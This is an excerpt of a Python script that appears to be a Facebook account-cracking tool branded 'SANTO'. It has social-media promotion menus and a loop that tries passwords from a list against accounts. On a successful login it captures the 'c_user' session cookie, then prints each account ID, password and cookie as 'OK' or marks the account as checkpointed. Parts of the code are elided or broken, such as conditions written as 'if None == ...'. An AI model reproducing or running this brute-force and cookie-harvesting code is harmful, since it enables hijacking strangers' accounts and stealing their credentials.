...
def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] Subscribe YouTube')
    print(' [2] Exit')
    opt = input('\n   Choose option: ')
    if opt == '1':
        os.system('www.youtube.com')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] Subscribe YouTube')
    print(' [2] Exit')
...
def o():
    ...
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY INSTAGRAM')
    ...
    if opt == '1':
        i()
    if None == '2':
        ('https://www.facebook.com/SANTO-😎.ahmed6')
        return None
    if None == '3':
        os.system('www.instagram.com/weirdSANTO-😎')
        return None
    if None == '4':
        os.system('https://github.com/weirdSANTO-😎/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚════╝░
                                                   ...
                                                   [Santo Gaming]                                        
 _______________________________________________________________________\033[1;33m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SANTO-😎-OK??)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(SANTO-😎-CP??)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[SANTO-😎] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
